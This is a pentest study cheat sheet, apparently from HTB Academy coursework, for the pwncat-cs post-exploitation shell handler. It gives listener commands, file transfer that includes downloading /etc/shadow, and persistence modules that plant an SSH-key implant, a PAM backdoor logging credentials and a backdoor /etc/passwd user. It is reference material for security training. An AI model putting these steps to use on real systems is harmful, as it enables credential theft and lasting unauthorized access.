# pwncat

**Tags:** `#pwncat` `#shells` `#remoteaccess` `#postexploit` `#linux`

Post-exploitation framework built around a reverse/bind shell handler. Automatically upgrades shells to fully interactive PTYs, handles file upload/download, runs local scripts, and provides a persistent session manager. Linux-focused.

**Source:** https://github.com/calebstewart/pwncat
**Install:** `pip install pwncat-cs` or `pipx install pwncat-cs`

```bash
# Start listener
pwncat-cs -lp 4444
```

> [!note]
> When a shell connects, pwncat automatically upgrades it to a full PTY. Use `Ctrl+D` to send EOF or `Ctrl+C` to background the remote shell and drop to the pwncat local prompt. Type `help` for available commands.

---

## Starting a Listener

```bash
# TCP reverse-shell listener (binds all interfaces; `pwncat-cs :4444` is equivalent)
pwncat-cs -lp 4444

# Connect out to an existing bind shell on the target
pwncat-cs 10.129.14.128:4444
```

---

## Session Navigation

```bash
# In remote shell — background and drop to the local (pwncat) prompt
Ctrl+D

# Back to remote shell from local prompt — the command is `back` (Ctrl+D also toggles)
(local) back
(local) sessions    # list sessions
(local) sessions 0  # interact with session 0
```

---

## File Transfer

```bash
# From local prompt — upload to target
(local) upload /local/path/linpeas.sh /tmp/linpeas.sh

# Download from target
(local) download /etc/shadow /local/shadow.txt

# Upload and run
(local) upload /local/linpeas.sh /tmp/linpeas.sh
(remote) chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

---

## Built-in Modules

```bash
# From local prompt — enumeration is the `enumerate` module, filtered by type
(local) run enumerate                       # gather all facts
(local) run enumerate types=system.network  # just network info
(local) run enumerate types=user            # users
# Persistence modules are under linux.implant.* (there is no implant.ssh / persist.cron):
(local) run linux.implant.authorized_key key=~/.ssh/id_rsa.pub   # SSH key persistence
(local) run linux.implant.pam                                    # PAM backdoor (log creds)
(local) run linux.implant.passwd                                 # add backdoor /etc/passwd user
```

---

## Shell Upgrade

pwncat handles TTY upgrade automatically. If connecting to a plain nc listener, it runs:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# + stty/TERM fixes
```

Manual upgrade (when not using pwncat):
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

---

## Reconnect / Persistence

```bash
# From local prompt, plant the SSH-key implant:
(local) run linux.implant.authorized_key key=~/.ssh/id_rsa.pub

# Reconnect via SSH next time (pwncat also tracks installed implants for `reconnect`)
pwncat-cs ssh://user@10.129.14.128
```

---

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]] (CPTS v2): pwncat-cs is the recommended Linux listener — it auto-upgrades the TTY on connect (no manual `stty raw -echo; fg` dance) and adds file transfer + persistence.

---

*Created: 2026-03-13*
*Updated: 2026-08-31*
*Model: claude-opus-5*
